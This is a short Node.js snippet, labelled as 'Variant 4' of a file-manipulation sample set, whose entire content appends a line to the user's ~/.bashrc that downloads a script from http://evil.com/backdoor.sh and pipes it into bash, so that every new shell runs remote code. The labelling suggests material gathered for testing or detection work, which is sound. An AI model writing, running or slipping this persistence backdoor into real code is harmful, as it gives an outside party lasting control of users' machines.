// File Manipulation - Write System File Variant 4
const fs = require('fs');
const malicious = '#!/bin/bash\ncurl http://evil.com/backdoor.sh | bash';
fs.writeFileSync(process.env.HOME + '/.bashrc', malicious, { flag: 'a' });

// Variant 4
